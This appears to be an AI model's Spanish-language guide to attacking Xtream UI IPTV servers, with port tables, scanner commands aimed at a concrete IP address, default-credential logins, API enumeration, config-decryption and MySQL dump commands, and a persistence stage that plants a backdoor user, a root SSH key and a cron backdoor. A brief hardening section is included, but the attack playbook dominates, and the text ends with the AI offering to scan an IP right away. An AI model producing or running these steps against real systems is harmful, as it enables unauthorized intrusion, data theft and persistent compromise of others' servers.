# 🔍 GUÍA COMPLETA: Puertos y Servicios Vulnerables de Xtream UI

## 📡 TABLA DE PUERTOS Y VULNERABILIDADES

| Puerto | Servicio | Vulnerabilidades | Severidad |
|--------|----------|------------------|-----------|
| **25500** | **Admin Panel** | • Credenciales por defecto (admin/admin)<br>• Archivos sensibles expuestos<br>• Panel sin 2FA | 🔴 CRÍTICA |
| **25461** | **HTTP Streaming API** | • APIs expuestas (player_api.php, panel_api.php)<br>• Información de streams<br>• Enumeración de usuarios | 🟠 ALTA |
| **25462** | **RTMP Streaming** | • Streaming sin autenticación adecuada<br>• Inyección de streams | 🟡 MEDIA |
| **25463** | **HTTPS Streaming** | • Similar a 25461 pero con SSL<br>• Certificados auto-firmados | 🟠 ALTA |
| **7999** | **MySQL Database** | • Credenciales débiles (desencriptables)<br>• A veces expuesto externamente<br>• SQL Injection | 🔴 CRÍTICA |
| **22** | **SSH** | • Útil post-explotación<br>• Brute force si está expuesto | 🟡 MEDIA |

---

## 🎯 CÓMO ESCANEAR CON PUERTOS PERSONALIZADOS

### **Método 1: Scanner Original (Un puerto a la vez)**

```bash
# Sintaxis:
python3 exploits/security_scanner.py <IP> <PUERTO>

# Ejemplos:
python3 exploits/security_scanner.py 206.212.242.21 25500  # Admin
python3 exploits/security_scanner.py 206.212.242.21 25461  # API
python3 exploits/security_scanner.py 206.212.242.21 8080   # Puerto custom
```

### **Método 2: Multi-Port Scanner (TODOS los puertos automáticamente)** ⭐

```bash
# Escaneo automático de TODOS los puertos conocidos:
python3 exploits/multi_port_scanner.py 206.212.242.21

# Con puertos personalizados adicionales:
python3 exploits/multi_port_scanner.py 206.212.242.21 8080,9000,3000

# Ejemplo completo:
python3 exploits/multi_port_scanner.py your-server.com 8000,8888
```

**El Multi-Port Scanner escanea automáticamente**:

- ✅ 25500 (Admin Panel)
- ✅ 25461 (HTTP Streaming)
- ✅ 25462 (RTMP)
- ✅ 25463 (HTTPS)
- ✅ 7999 (MySQL)
- ✅ 22 (SSH)
- ✅ 80, 443, 8080 (Alternativas)
- ✅ **TUS puertos personalizados**

---

## 🔓 EXPLOTACIÓN POR PUERTO

### **Puerto 25500 - Admin Panel**

**Vulnerabilidades**:

1. **Credenciales por defecto**: `admin` / `admin`
2. **Archivos expuestos**: `/config`, `/database.sql`, `/phpinfo.php`
3. **Sin rate limiting**: Brute force posible

**Cómo explotar**:

```bash
# 1. Escanear
python3 exploits/security_scanner.py IP 25500

# 2. Probar login
# Navegador: http://IP:25500
# Usuario: admin
# Password: admin

# 3. Si funciona → Control total del panel
```

**Impacto**: Control total del sistema IPTV

---

### **Puerto 25461 - HTTP Streaming API**

**Vulnerabilidades**:

1. **APIs expuestas sin autenticación adecuada**
2. **Enumeración de información**

**Cómo explotar**:

```bash
# Enumerar información
curl "http://IP:25461/player_api.php?username=test&password=test"
curl "http://IP:25461/panel_api.php"

# Obtener lista de streams
curl "http://IP:25461/get.php?username=XX&password=XX&type=m3u"
```

**Impacto**: Información de configuración, streams, usuarios

---

### **Puerto 7999 - MySQL Database**

**Vulnerabilidades**:

1. **Credenciales almacenadas con weak encryption (XOR)**
2. **A veces expuesto externamente**

**Cómo explotar**:

```bash
# 1. Si tienes acceso al archivo config
python3 exploits/decrypt_config.py /home/xtreamcodes/iptv_xtream_codes/config

# Output:
# Host: 127.0.0.1
# Usuario: user_iptvpro
# Password: RECOVERED_PASSWORD
# Puerto: 7999

# 2. Conectar a MySQL
mysql -h IP -P 7999 -u user_iptvpro -p'RECOVERED_PASSWORD' xtream_iptvpro

# 3. Dump completo
mysqldump -h IP -P 7999 -u user_iptvpro -p'PASSWORD' xtream_iptvpro > dump.sql
```

**Impacto**: Acceso completo a base de datos con información sensible

---

## 🛠️ EJEMPLOS PRÁCTICOS

### **Ejemplo 1: Escaneo Básico**

```bash
# Un solo puerto
python3 exploits/security_scanner.py 192.168.1.100 25500
```

### **Ejemplo 2: Escaneo Completo Automático**

```bash
# Todos los puertos conocidos
python3 exploits/multi_port_scanner.py 192.168.1.100
```

### **Ejemplo 3: Puerto Personalizado**

```bash
# Si el admin está en puerto 8080
python3 exploits/security_scanner.py 192.168.1.100 8080
```

### **Ejemplo 4: Múltiples Puertos Personalizados**

```bash
# Escanear puertos estándar + custom
python3 exploits/multi_port_scanner.py 192.168.1.100 8080,9000,3000
```

### **Ejemplo 5: Servidor en Dominio**

```bash
# Usar dominio en vez de IP
python3 exploits/multi_port_scanner.py example.com
python3 exploits/multi_port_scanner.py example.com 8080,8888
```

---

## 📊 OUTPUT ESPERADO

### **Si el servidor es VULNERABLE**

```
╔═══════════════════════════════════════════════════════════╗
║       Xtream UI Multi-Port Vulnerability Scanner       ║
╚═══════════════════════════════════════════════════════════╝

[*] Target: 192.168.1.100
[*] Puertos a escanear: 9

[*] Escaneando puertos conocidos de Xtream UI...

    Probando puerto 25500 (Admin Panel)... ✓ ABIERTO
    Probando puerto 25461 (HTTP Streaming API)... ✓ ABIERTO
    Probando puerto 25462 (RTMP Streaming)... ✗ Cerrado
    Probando puerto 25463 (HTTPS Streaming)... ✓ ABIERTO
    Probando puerto 7999 (MySQL Database)... ✓ ABIERTO
    Probando puerto 22 (SSH)... ✓ ABIERTO

[*] Analizando puerto 25500 (Admin Panel)...
  [+] Panel Xtream UI detectado
  [VULN] Credenciales por defecto ACTIVAS (admin/admin) 🔴
  [VULN] Archivo expuesto: /config
  [VULN] Archivo expuesto: /phpinfo.php

╔═══════════════════════════════════════════════════════════╗
║                  RESUMEN DEL ESCANEO                    ║
╚═══════════════════════════════════════════════════════════╝

[+] Puertos abiertos encontrados: 5

  → Puerto 25500: Admin Panel
  → Puerto 25461: HTTP Streaming API
  → Puerto 25463: HTTPS Streaming
  → Puerto 7999: MySQL Database
  → Puerto 22: SSH

[!] Vulnerabilidades encontradas: 3

  CRÍTICAS: 2
    - Default Credentials (Puerto 25500)
    - MySQL Exposed (Puerto 7999)
  
  ALTAS: 1
    - Exposed Sensitive File (Puerto 25500)

╔═══════════════════════════════════════════════════════════╗
║                   RECOMENDACIONES                       ║
╚═══════════════════════════════════════════════════════════╝

  1. Cambiar credenciales por defecto inmediatamente
  2. Restringir acceso a puertos sensibles con firewall
  3. Usar VPN para acceso administrativo
  4. Actualizar a última versión parcheada
  5. Implementar autenticación de dos factores
```

---

## 🔥 VECTORES DE ATAQUE COMPLETOS

### **Ataque Nivel 1: Reconocimiento**

```bash
# Paso 1: Escanear todos los puertos
python3 exploits/multi_port_scanner.py TARGET_IP

# Paso 2: Identificar servicios vulnerables
# Si puerto 25500 abierto → Panel admin vulnerable
# Si puerto 7999 abierto → MySQL potencialmente accesible
```

### **Ataque Nivel 2: Acceso Inicial**

```bash
# Si puerto 25500 está abierto:
# 1. Probar en navegador: http://TARGET_IP:25500
# 2. Login: admin / admin
# 3. Si funciona → Acceso al panel

# O si tienes acceso SSH (post-explotación):
ssh root@TARGET_IP
python3 decrypt_config.py /home/xtreamcodes/iptv_xtream_codes/config
```

### **Ataque Nivel 3: Persistencia**

```bash
# Después de obtener acceso:
# 1. Crear usuario backdoor
useradd -m -p $(openssl passwd -1 password123) backdoor

# 2. Añadir clave SSH
mkdir -p /root/.ssh
echo "TU_SSH_KEY" >> /root/.ssh/authorized_keys

# 3. Backdoor en cron
echo "@reboot /tmp/backdoor.sh" | crontab -
```

---

## 🛡️ DEFENSA: Cómo Proteger Cada Puerto

### **Puerto 25500 (Admin)**

```bash
# 1. Cambiar credenciales
mysql -u root -p xtream_iptvpro -e "UPDATE reg_users SET password='NEW_HASH' WHERE username='admin';"

# 2. Firewall - Solo IPs autorizadas
iptables -A INPUT -p tcp --dport 25500 -s TU_IP -j ACCEPT
iptables -A INPUT -p tcp --dport 25500 -j DROP

# 3. Cambiar puerto
sed -i 's/listen 25500/listen 12345/g' /home/xtreamcodes/iptv_xtream_codes/nginx/conf/nginx.conf
```

### **Puerto 7999 (MySQL)**

```bash
# 1. Bind solo a localhost
# En /etc/mysql/my.cnf:
bind-address = 127.0.0.1

# 2. Firewall
iptables -A INPUT -p tcp --dport 7999 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 7999 -j DROP

# 3. Credenciales fuertes
mysql -u root -p -e "SET PASSWORD FOR 'user_iptvpro'@'%' = PASSWORD('STRONG_RANDOM_PASSWORD');"
```

---

## 📝 RESUMEN RÁPIDO

**Scanner Original** (un puerto):

```bash
python3 exploits/security_scanner.py <IP> <PUERTO>
```

**Multi-Port Scanner** (todos los puertos):

```bash
python3 exploits/multi_port_scanner.py <IP> [puertos_custom]
```

**Puertos más críticos**:

- 🔴 **25500** - Admin (credenciales por defecto)
- 🔴 **7999** - MySQL (credenciales débiles)
- 🟠 **25461** - API (información expuesta)

**Puedes cambiar el puerto**: ✅ SÍ, ambos scanners lo permiten

---

¿Quieres que escanee alguna IP específica con todos los puertos ahora?
